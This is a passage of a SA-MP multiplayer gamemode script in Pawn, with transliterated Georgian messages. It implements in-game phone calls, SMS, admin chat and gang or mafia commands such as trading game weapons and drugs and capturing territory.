		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/c [Telefonis Nomeri] (555 - Abonenta Momsaxureba) (911 - Sagangebo Situaciebis Samsaxuri)");
		new number = strval(tmp);
		if(number == 555)
		{
			ShowPlayerDialog(playerid,dService,2,"Shtatis Abonenta Momsaxureba","1. Taxi","OK","CLOSE");
			return true;
		}
		else if(number == 911)
		{
			ShowPlayerDialog(playerid,dEmergencyCall,2,"Shtatis Sagangebo Situaciebis Samsaxuri","1. Policia\n2. Saswrafo Daxmareba\n3. Meqaniki","OK","CLOSE");
			return true;
		}
		else if(number == 9900)
		{
			if(!gNewsDialing) return SendClientMessage(playerid,CGRAY,"Zarebi Ar Miigeba.");
			if(gNewsDialee != INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Telefoni Dakavebulia.");
			if(pData[playerid][pFraction] == 10) return SendClientMessage(playerid,CGRAY,"Tqven Ver Daukavshirdit Tqven Organizacias.");
			if(GetPlayerMoneyEx(playerid) < gNewsDialPrice) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tanxa.");
            new mes2[256];
			format(mes2,sizeof(mes2),"Zaris Safasuri: $%d\n\n{"#cRED"}Yuradgeba! {"#cWHITE"}Ar Aris Gamorucxuli, Rom Tqvenma Zarma Ver Miagwios Adresattan.\nFuli Chamogechrebat Nebismier Shemtxvevashi.\n\n\t\t\t{"#cYELLOW"}Gaagrdzeleb?",gNewsDialPrice);
			ShowPlayerDialog(playerid,dNewsDial,0,"Darekva",mes2,"YES","NO");
		}
		else if(!number) return SendClientMessage(playerid,CGRAY,"Motamashe Am Nomrit Ar Aris Serverze");
		new id = -1;
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i)) continue;
			if(pData[i][pPhone] == number) {id = i; break;}
		}
		if(id == -1) return SendClientMessage(playerid,CGRAY,"Motamashe Am Nomrit Ar Aris Serverze.");
		if(GetPVarInt(id,"TPhone") == 0 || GetPVarInt(id,"TPhone") == 2) return SendClientMessage(playerid,CGRAY,"Motamashem Gamorto Telefoni.");
		if(gCalls[id][g_caller] != INVALID_PLAYER_ID || gCalls[id][g_callee] != INVALID_PLAYER_ID || id == playerid) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Nomeri Dakavebulia.");
		gCalls[playerid][g_caller] = playerid;
		gCalls[playerid][g_callee] = id;
		gCalls[id][g_caller] = playerid;
		gCalls[id][g_callee] = id;
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
		SetPlayerAttachedObject(playerid,0,330,6);
		format(mes,sizeof(mes),"%s Girekaft Telefonze. {"#cGRAY"}(/p - Upasuxe, /h - Gautishe)",Name2(playerid));
		SendClientMessage(id,CWHITE,mes);
	}
	if (!strcmp(cmd,"/p",true))
	{
		if(gCalls[playerid][g_callee] != playerid) return SendClientMessage(playerid,CGRAY,"Tqven Ar Girekavt Aravin.");
		if(GetPVarInt(playerid,"Ether") == 1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Shegidzliat Etershi Laparaki.");
		new caller = gCalls[playerid][g_caller];
		if(caller == INVALID_PLAYER_ID || !IsPlayerConnected(caller)) return SendClientMessage(playerid,CGRAY,"Saubari Dasrulda.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
		SetPlayerAttachedObject(playerid,0,330,6);
		SendClientMessage(caller,CYELLOW,"Davukavshirdit Tanamosaubres.");
		SetPVarInt(playerid,"pCall",1);
		SetPVarInt(caller,"pCall",1);
	}
	if (!strcmp(cmd,"/h",true))
	{
		if(gNewsDialee == playerid)
		{
			SendClientMessage(playerid,CWHITE,"Tqven Gatishet Yurmili.");
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
			SetTimerEx("ClearPhone",2000,false,"i",playerid);
			gNewsDialee = INVALID_PLAYER_ID;
			SendClientMessage(gNewsDialer,CSYSTEM,"Motamashem Gatisha Yurmili..");
			return true;
		}
		if(gCalls[playerid][g_caller] == INVALID_PLAYER_ID && gCalls[playerid][g_callee] == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gamoiyenet Telefoni.");
		new id;
		if(gCalls[playerid][g_caller] == playerid) id = gCalls[playerid][g_callee];
		else if(gCalls[playerid][g_callee] == playerid) id = gCalls[playerid][g_caller];
		else return SendClientMessage(playerid,CGRAY,"Shecdoma (#112)");
		SendClientMessage(playerid,CYELLOW,"Tqven Gatishet Yurmili.");
		SendClientMessage(id,CYELLOW,"Tanamosaubrem Gatisha Yurmili.");
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetTimerEx("ClearPhone",2000,false,"i",playerid);
		SetPlayerSpecialAction(id,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetTimerEx("ClearPhone",2000,false,"i",id);
		gCalls[playerid][g_caller] = INVALID_PLAYER_ID;
		gCalls[playerid][g_callee] = INVALID_PLAYER_ID;
		gCalls[id][g_caller] = INVALID_PLAYER_ID;
		gCalls[id][g_callee] = INVALID_PLAYER_ID;
		SetPVarInt(playerid,"pCall",0);
		SetPVarInt(id,"pCall",0);
	}
	if (!strcmp(cmd,"/a",true))
	{
		if(!pData[playerid][pAdmin]) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return  SendClientMessage(playerid, CGRAY, "/a [Texti]");
		format(mes,sizeof(mes),"[Admin Chat] %s[%i]: {72C43F}%s",Name2(playerid),playerid,tmp);
		//AdminChat(0xF5810CAA,mes);
		AdminChat(0xB5D2CCAA,mes);
	}
	if (!strcmp(cmd,"/hc",true))
	{
		if(!pData[playerid][pHelper]) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return  SendClientMessage(playerid, CGRAY, "/hc [Texti]");
		format(mes,sizeof(mes),"[Helper Chat] %s[%i]: {72C43F}%s",Name2(playerid),playerid,tmp);
		//AdminChat(0xF5810CAA,mes);
		HelperChat(0xB5D2CCAA,mes);
 	}
	if (!strcmp(cmd,"/ah",true))
	{
		if(pData[playerid][pAdmin] > 0 || pData[playerid][pHelper] >= 1)
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return  SendClientMessage(playerid, CGRAY, "/ah [Texti]");
		format(mes,sizeof(mes),"[A/H] %s[%i]: {72C43F}%s",Name2(playerid),playerid,tmp);
		HelperChat(0xF5810CAA,mes);
		AdminChat(0xB5D2CCAA,mes);
	}
	if (!strcmp(cmd,"/sms",true) || !strcmp(cmd,"/t",true))
	{
		if(!pData[playerid][pPhone]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saati, Iyidet Is 24/7-Shi");
		if(GetPVarInt(playerid,"TPhone") == 0 || GetPVarInt(playerid,"TPhone") == 2) return SendClientMessage(playerid,CGRAY,"Tqven Unda Gaaqtiurot Telefoni");
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute");
		if(pData[playerid][pJail]) return SendClientMessage(playerid, CGRAY, "Tqven Xart Cixeshi.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sms [Telefonis Nomeri] [Texti]");
		new id = -1;
		if(strlen(tmp) <= 1) return SendClientMessage(playerid,CGRAY,"Nomeri Unda Sheicavdes 2-Ze Met Cifrs");
		else
		{
			new number = strval(tmp);
			if(!number) return SendClientMessage(playerid,CGRAY,"Motamashe Am Nomrit Ar Aris Serverze");
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				if(pData[i][pPhone] == number) {id = i; break;}
			}
		}
		tmp = strrest(cmdtext, idx);
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		if(id == -1) return SendClientMessage(playerid,CGRAY,"Motamashe Am Nomrit Ar Aris Serverze");
		if(!pData[id][pPhone]) return SendClientMessage(playerid,CGRAY,"Motamashes Ar Aqvs Telefoni");
		if(GetPVarInt(id,"TPhone") == 0 || GetPVarInt(id,"TPhone") == 2) return SendClientMessage(playerid,CGRAY,"Abonents Gatishuli Aqvs Telefoni");
		if(pData[id][pJail]) return SendClientMessage(playerid, CGRAY, "Abonenti Cixeshia.");
		format(mes,sizeof(mes),"%s. Adresati: %s (Tel. %d)",tmp,Name2(id),pData[id][pPhone]);
		SendClientMessage(playerid,CYELLOW,mes);
		format(mes,sizeof(mes),"Avtori %s[%d] (Tel. %d): %s",Name2(playerid),playerid,pData[playerid][pPhone],tmp);
		SendClientMessage(id,CYELLOW,mes);
		PlayerPlaySound(playerid,1054,0.0,0.0,0.0);
		PlayerPlaySound(id,1054,0.0,0.0,0.0);
	}
	if(!strcmp(cmd,"/takephone",true))
	{
	    if(!IsAMafia(playerid)) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/takephone [ID Motamashis]");
		new actplayerid = strval(tmp);
		if(!IsPlayerConnected(actplayerid)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,actplayerid) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(actplayerid)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
        if(!pData[actplayerid][pPhone]) return SendClientMessage(playerid,CGRAY,"Motamashes Ar Aqvs Telefoni.");
        if(pData[playerid][pFraction] == pData[actplayerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Ar Shegidzlia Chamoartva Telefoni, SHens Mokavshires.");
        SetPVarInt(actplayerid,"TPhone",3);
        format(mes,sizeof(mes),"%s Aigo Teleponi %s",Name2(playerid),Name2(actplayerid));
		MeAction(playerid,mes);
	}
	if (!strcmp(cmd,"/togphone",true))
	{
		if(!pData[playerid][pPhone]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Saati, Iyidet Is 24/7-Shi");
        if(GetPVarInt(playerid,"TPhone") == 2) return SendClientMessage(playerid,CGRAY,"Tqveni Telefoni Shercheulia.");
		if(GetPVarInt(playerid,"TPhone") == 0)
		{
			SetPVarInt(playerid,"TPhone",1);
			SendClientMessage(playerid,CGREEN,"Telefoni Chartulia");
		}
		else
		{
			SetPVarInt(playerid,"TPhone",0);
			SendClientMessage(playerid,CGREEN,"Telefoni Gamortulia");
		}
	}
	if(!strcmp(cmd,"/lmenu",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Shen Ar Xar Organizaciashi");
		new fractionid = pData[playerid][pFraction]-1;
		if(pData[playerid][pRank] != gFractionRankCount[fractionid]) return SendClientMessage(playerid,CGRAY,"Menu Xelmisawvdomia Mxolod Liderebistvis");
		if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7)
		{
			ShowPlayerDialog(playerid,dGangLeader,2,"Leader Menu","1. Rankis Saxelebis Shecvla\n2. Dzalauflebis Minicheba\n3. Iyide Avtomobili (Bandistvis)\n4. Gayide Avtomobili (Bandistvis)","OK","CLOSE");
		}
	}
	if(!strcmp(cmd,"/gob",true))
	{
		if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Bandistvis");
		new fractionid = pData[playerid][pFraction]-1;
		if(pData[playerid][pRank] < gGangAccess[fractionid-2][0]-1) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Dashveba Saerto Tanxebtan");
		ShowPlayerDialog(playerid,dObshak,2,"Saerto Tanxa","Metali\nTyviebi\nFuli","NEXT","CLOSE");
	}
	if(!strcmp(cmd,"/givegun",true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givegun [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || playerid == id) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		new weaponid = GetPlayerWeapon(playerid);
		new ammo = GetPlayerAmmo(playerid);
		if(!weaponid) return SendClientMessage(playerid,CGRAY,"Daichiret Xelshi Iaragi, Romlis Micemac Gsurt");
        GivePlayerWeaponEx(playerid,weaponid,0);
		SetPlayerAmmoEx(playerid,weaponid,0);
		SetPlayerArmedWeapon(playerid,0);
		GivePlayerWeaponEx(id,weaponid,ammo);
		format(mes,sizeof(mes),"Gadasca Iaragi %s",Name2(id));
		MeAction(playerid,mes);
	}
	if(!strcmp(cmd,"/givedrugs",true))
	{
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givedrugs [ID Motamashis] [Raodenoba]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || playerid == id) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givedrugs [ID Motamashis] [Raodenoba]");
		new patr = strval(tmp);
		if(pData[playerid][pDrugs] < patr || patr < 0) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Amdeni Narkotiki");
		pData[playerid][pDrugs] -= patr;
		UpdatePlayerData(playerid, "drugs", pData[playerid][pDrugs]);
		pData[id][pDrugs] += patr;
		Pokaz(playerid,4,patr,0);
		Pokaz(id,4,patr,1);
		UpdatePlayerData(id, "drugs", pData[id][pDrugs]);
		format(mes,sizeof(mes),"Gadasca %d Narkotiki %s",patr,Name2(id));
  		MeAction(playerid,mes);
		return true;
	}
	if(!strcmp(cmd,"/givegrain",true))
	{
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givegrain [ID Motamashis] [Raodenoba]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || playerid == id) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givegrain [ID Motamashis] [Raodenoba]");
		new patr = strval(tmp);
		if(pData[playerid][pGrain] < patr || patr < 0) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Amdeni Marcvali");
		pData[playerid][pGrain] -= patr;
		UpdatePlayerData(playerid, "grain", pData[playerid][pGrain]);
		pData[id][pGrain] += patr;
		UpdatePlayerData(id, "grain", pData[id][pGrain]);
		Pokaz(playerid,5,patr,0);
		Pokaz(id,5,patr,1);
		format(mes,sizeof(mes),"Gadasca %d Marcvali %s",patr,Name2(id));
  		MeAction(playerid,mes);
		return true;
	}
	if(!strcmp(cmd,"/givemetall",true))
	{
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givemetall [ID Motamashis] [Raodenoba]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || playerid == id) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givemetall [ID Motamashis] [Raodenoba]");
		new patr = strval(tmp);
		if(pData[playerid][pGunAmount] < patr || patr < 0) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Amdeni Metali");
		pData[playerid][pGunAmount] -= patr;
		UpdatePlayerData(playerid, "gunamount", pData[playerid][pGunAmount]);
		pData[id][pGunAmount] += patr;
		UpdatePlayerData(id, "gunamount", pData[id][pGunAmount]);
		Pokaz(playerid,3,patr,0);
		Pokaz(id,3,patr,1);
		format(mes,sizeof(mes),"Gadasca %d Metali %s",patr,Name2(id));
  		MeAction(playerid,mes);
		return true;
	}
	if(!strcmp(cmd,"/giveammo",true))
	{
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/giveammo [ID Motamashis] [Raodenoba]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || playerid == id) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/giveammo [ID Motamashis] [Raodenoba]");
		new patr = strval(tmp);
		if(pData[playerid][pAmmo] < patr || patr < 0) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Amdeni Tyvia");
		pData[playerid][pAmmo] -= patr;
		UpdatePlayerData(playerid, "ammo", pData[playerid][pAmmo]);
		pData[id][pAmmo] += patr;
		UpdatePlayerData(id, "ammo", pData[id][pAmmo]);
		Pokaz(playerid,2,patr,0);
		Pokaz(id,2,patr,1);
		format(mes,sizeof(mes),"Gadasca %d Tyviebi %s",patr,Name2(id));
  		MeAction(playerid,mes);
		return true;
	}
	if(!strcmp(cmd,"/sellgun",true))
	{
		if(!IsGang(pData[playerid][pFraction])) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Bandistvis");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sellgun [ID Motamashis] [Tyviebis Raodenoba] [Fasi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sellgun [ID Motamashis] [Tyviebis Raodenoba] [Fasi]");
		new needammo = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sellgun [ID Motamashis] [Tyviebis Raodenoba] [Fasi]");
		new price = strval(tmp);
		if(price > 300000 || price < 1) return SendClientMessage(playerid,CGRAY,"Fasi Unda Iyos $1-Dan $300-Mde.");
		if(needammo > 300000 || needammo < 1) return SendClientMessage(playerid,CGRAY,"Araswori Tyviebis Raodenoba.");
		new weaponid = GetPlayerWeapon(playerid);
		new ammo = GetPlayerAmmo(playerid);
		if(!weaponid) return SendClientMessage(playerid,CGRAY,"Daichiret Xelshi Iaragi, Romlis Gayidvac Gsurt.");
		if(ammo < needammo) return SendClientMessage(playerid,CGRAY,"Tqven Ar Gaqvt Sakmarisi Tyviebi.");
		SetPVarInt(playerid,"gunoffee",id);
		SetPVarInt(id,"gunoffee",id);
		SetPVarInt(id,"gunoffer",playerid);
		SetPVarInt(id,"gunprice",price);
		SetPVarInt(id,"gunammo",needammo);
		SetPVarInt(id,"gunid",weaponid);
		new weapname[24];
		GetWeaponName(weaponid,weapname,24);
		SFCM(playerid,CINFO,"Tqven Shestavazet {"#cWHITE"}%s{"#cINFO"} Iyidos {"#cWHITE"}%s{"#cINFO"} Fasad: {"#cWHITE"}$%d. {"#cINFO"}Tyvebi: {"#cWHITE"}%d",Name2(id),weapname,price,needammo);
		SFCM(id,CINFO,"%s{"#cINFO"} Shemogtavazat Iyidot {"#cWHITE"}%s{"#cINFO"} Fasad: {"#cWHITE"}$%d. {"#cINFO"}Tyviebi: {"#cWHITE"}%d",Name2(playerid),weapname,price,needammo);
		SendClientMessage(id,CINFO,"Amis Dasadastureblad Daachiret {"#cGREEN"}Y, {"#cINFO"} Uaryofistvis {"#cRED"}N");
	}
	if(!strcmp(cmd,"/bangam",true))
	{
		if(!IsGang(pData[playerid][pFraction])) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Bandistvis");
		if(GetPVarInt(playerid,"Bangam") == 1)
		{
			SetPlayerColor(playerid,0xFFFFFF11);
			SetPVarInt(playerid,"Bangam",0);
			MeAction(playerid,"Moixsna Bendena");
		}
		else
		{
			SetPlayerColor(playerid,gFractionColor[pData[playerid][pFraction] - 1]);
			SetPVarInt(playerid,"Bangam",1);
			MeAction(playerid,"Gaiketa Bendena");
		}
	}
	if(!strcmp(cmd,"/en",true))
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) ToggleEngine(GetPlayerVehicleID(playerid));
	}
	if(!strcmp(cmd, "/mafiajob", true))
	{
	    if(!IsAMafia(playerid)) return true;
     	ShowPlayerDialog(playerid,dMafiaJob,2,"Airchie Davaleba","1. Valis Dabruneba\n2. Dzarcva\n3. Miige Davalebis Gasamrjelo\n4. Davalebis Dasruleba","Archeva","Daxurva");
	}
	if(!strcmp(cmd, "/gangjob", true))
	{
	    if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return true;
     	ShowPlayerDialog(playerid,dGangJob,2,"Airchie Davaleba","1. Medikamentebis Moparva\n2. Miige Davalebis Gasamrjelo\n3. Davalebis Dasruleba","Archeva","Daxurva");
	}
	if(!strcmp(cmd, "/bizlist", true))
	{
		if(!IsAMafia(playerid)) return true;
		new strrr1[2000],mafiatext[40];
		for(new id = 0; id < MAX_BUSINESS_COUNT; id++)
  		{
            switch(gBusiness[id][busiMafia])
			{
    			case F_COL: mafiatext = "RM";
		 		case F_MEX: mafiatext = "LCN";
    			case F_YAK: mafiatext = "Yakuza";
			}
   			if(id <= 30) format(strrr1, 2400, "%s%d. %s, [%s]\n",strrr1,id,gBusiness[id][busiName],mafiatext);
  		}
  		ShowPlayerDialog(playerid, dBizLis, 0, "Biznesi", strrr1, "Shemdeg", "Damalva");
  		SendClientMessage(playerid,CGRAY,"Biznesis Mosadzebnad, Gamoiyenet {1e90ff}/findbiz");
		return true;
	}
	if(!strcmp(cmd, "/findbiz", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, CGRAY, "/findbiz [ID Biznesis]");
		new housenum = strval(tmp);
		if(housenum == 0) return true;
		SetPlayerRaceCheckpoint(playerid, 1, gBusiness[housenum][busiX], gBusiness[housenum][busiY], gBusiness[housenum][busiZ], 0.0,0.0,0.0,6);
      	return true;
 	}
	if(!strcmp(cmd,"/bizwar",true))
	{
	    if(IsStrela == 1) return true;
	    if(IsAMafia(playerid))
	    {
	        new str[100];
	        new atext[100];
			for(new id = 0; id < MAX_BUSINESS_COUNT; id++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 15.0, gBusiness[id][busiX], gBusiness[id][busiY], gBusiness[id][busiZ]))
				{
					switch(gBusiness[id][busiMafia])
					{
		    			case F_COL: atext = "RM";
	   			 		case F_MEX: atext = "LCN";
		    			case F_YAK: atext = "Yakuza";
					}
					if(gBusiness[id][busiMafia] == 0)
	 				{
	 				    gBusiness[id][busiMafia] = pData[playerid][pFraction];
					    UpdateBusinessData(id+1,"mafia",gBusiness[id][busiMafia]);
		                UpdateBusinessText(id);
		                return true;
					}
					if(gBusiness[id][busiMafia] == pData[playerid][pFraction]) return SendClientMessage(playerid, CGRAY, "Es Biznesi Gekutvnit Tqven");
					MafiaNapad = gBusiness[id][busiMafia];
					MafiaID = id;
					format(str, sizeof(str), "{FFFFFF}Am Biznesis Mflobelia %s", atext);
					ShowPlayerDialog(playerid,dBizWar,DIALOG_STYLE_MSGBOX,"{FFFF00}Tavdasxma Biznessze",str,"YES","NO");
				}
			}
	    }
	}
	if(!strcmp(cmd, "/capture", true))
	{
 		if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Bandistvis");
    	if(FrakCD[pData[playerid][pFraction]] == 0)
	    {
  			for(new i = 0; i < 150; i++)
			{
			    if(PlayerToKvadrat(playerid,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3]))
				{
				    if(GZInfo[i][gFrakVlad] == pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Es Teritoria Gekutvnit Tqven");
				    if(FrakCD[GZInfo[i][gFrakVlad]] > 0) return SendClientMessage(playerid,CGRAY,"Amjamad Ukve Mimdinareobs Teritoriistvis Brdzola.");
				    if(!IsPlayerInBandOnline(GZInfo[i][gFrakVlad])) return SendClientMessage(playerid,CGRAY,"Sheudzlebelia Teritoriis Dapyroba, Ar Aris Sakmaris Motamashe.");
					if(FrakCD[GZInfo[i][gFrakVlad]] != 0) return SendClientMessage(playerid,CGRAY,"Banda Romelzec Gsurt Tavdasxma, Ukve Ibrdzvis Am Momentshi.");
					if(captures > 0) return SendClientMessage(playerid,CGRAY,"Ukve Xelshi Chaigdet Ert-Erti Teritoria.");
					FrakCD[GZInfo[i][gFrakVlad]] = 1;
					FrakCD[pData[playerid][pFraction]] = 1;
					format(mes,sizeof(mes),"%s Daiwyeba Teritoriis Dapyroba %s",GetGangName(pData[playerid][pFraction]),GetGangName(GZInfo[i][gFrakVlad]));
					SendFMes(pData[playerid][pFraction],COLOR_LIGHTRED,mes);
					format(mes,sizeof(mes),"%s[%d] инициировал захват территории",Name2(playerid),playerid);
					SendFMes(pData[playerid][pFraction],COLOR_LIGHTRED,mes);
					format(mes,sizeof(mes),"%s Daiwyeba Teritoriis Dapyroba %s",GetGangName(pData[playerid][pFraction]),GetGangName(GZInfo[i][gFrakVlad]));
					SendFMes(GZInfo[i][gFrakVlad],COLOR_LIGHTRED,mes);
					GangZoneFlashForAll(GZInfo[i][gID],GetGZColorF(pData[playerid][pFraction]));
					GZSafeTime[i] = 800;
					captures = 1;
					GZInfo[i][gNapad] = pData[playerid][pFraction];
					ZoneOnBattle[i] = 1;
					CaptFight = i;
					GzChecker();
					break;
				}
    		}
	    }
    	else return SendClientMessage(playerid,-1,"Tqven Banda Ukve Ibrdzvis Teritoriistvis.");
    	//SendClientMessage(playerid,CGRAY,"На некоторое время капт - ЗАПРЕЩЕН. (Скоро вернем обратно)");
   	}
	if(!strcmp(cmd,"/givekey",true))
	{
		if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7 && pData[playerid][pRank] == 10)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givekey [ID Motamashis]");
			new id = strval(tmp);
			if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
			if(GetPVarInt(id,"GangKey") == 0) SetPVarInt(id,"GangKey",1);
			else SetPVarInt(id,"GangKey",0);
		}
		else return true;
	}
	if(!strcmp(cmd,"/grespawn",true))
	{
		if(pData[playerid][pFraction] >= 3 && pData[playerid][pFraction] <= 7 && pData[playerid][pRank] == 10)
		{
			if(gGangRespawnCar) return SendClientMessage(playerid,CGRAY,"Gaimeoret 1 Wutis Shemdeg");
			gGangRespawnCar = 1;
			new gangid = pData[playerid][pFraction]-3;
			for(new i=0;i<5;i++)
			{
				DestroyVehicle(aGang[gangid][i]);
				new vid;
				vid = CreateVehicle(gGangCars[gangid][i],gGangCarSlot[gangid][i][0],gGangCarSlot[gangid][i][1],gGangCarSlot[gangid][i][2],gGangCarSlot[gangid][i][3],gGangCarColors[gangid],gGangCarColors[gangid],900);
				aGang[gangid][i] = vid;
				gVehicles[vid - 1][vX] = gGangCarSlot[gangid][i][0];
				gVehicles[vid - 1][vY] = gGangCarSlot[gangid][i][1];
				gVehicles[vid - 1][vZ] = gGangCarSlot[gangid][i][2];
				gVehicles[vid - 1][vFuel] = 100;
				gVehicles[vid - 1][vLock] = 0;
				gVehicles[vid - 1][vID] = vid;
			}
			SendClientMessage(playerid,CGREEN,"Bandis Avtomobilebi Darespawnda");
		}
	}
	if(!strcmp(cmd,"/subleader",true))
	{
		if(!pData[playerid][pFraction]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Organizaciis Wevri");
		new fractionid = pData[playerid][pFraction] - 1;
		if(pData[playerid][pRank] < gFractionRankCount[fractionid]) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod Lideristvis");
		new frid = GetSubfractionID(fractionid);
		if(frid == -1) return SendClientMessage(playerid,CGRAY,"Tqvens Organizacias Ar Aqvs SubOrganizacia");
		tmp = strtok(cmdtext, idx);
